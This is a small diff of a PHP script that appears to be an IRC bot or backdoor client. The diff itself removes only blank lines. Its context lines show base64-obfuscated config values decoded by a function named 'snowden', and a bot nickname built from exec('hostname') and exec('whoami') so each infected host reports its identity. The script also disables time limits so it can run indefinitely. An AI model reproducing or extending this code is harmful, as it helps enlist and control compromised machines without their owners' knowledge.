@@ -1,5 +1,4 @@
 <?php
-
 set_time_limit(0);
 ini_set('display_errors', 'on');
 
@@ -11,7 +10,6 @@ $config = array(
         'nick'   => snowden('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
         'pass'   => snowden(''), 
 );
-
                                  
 function snowden($string) {
 
